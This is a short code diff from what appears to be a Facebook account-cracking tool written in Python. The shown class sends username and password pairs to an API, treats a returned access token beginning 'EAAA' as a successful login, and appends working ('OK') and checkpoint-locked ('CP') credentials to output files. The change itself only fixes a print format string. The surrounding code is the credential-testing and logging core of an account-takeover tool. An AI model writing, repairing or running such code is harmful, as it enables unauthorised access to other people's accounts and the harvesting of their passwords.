@@ -537,7 +537,7 @@ class bapi:
     response = requests.get(api, params=params)
     if re.search('(EAAA)\\w+', response.text):
       self.ok.append(username + ' • ' + password)
-      print("\r\x1b[0;32m   [OK] %s • %s %s               "%(username,password))
+      print("\r\x1b[0;32m   [OK] %s • %s %s               "%(username,password,N))
       save = open('out/ok.txt', 'a')
       save.write(str(username) + ' • ' + str(password) + '\n')
       save.close()
@@ -545,7 +545,7 @@ class bapi:
     else:
       if 'www.facebook.com' in response.json()['error_msg']:
         self.cp.append(username + ' • ' + password)
-        print("\r\x1b[0;33m   [CP] %s • %s %s               "%(username,password))
+        print("\r\x1b[0;33m   [CP] %s • %s %s               "%(username,password,N))
         save = open('out/cp.txt', 'a')
         save.write(str(username) + ' • ' + str(password) + '\n')
         save.close()
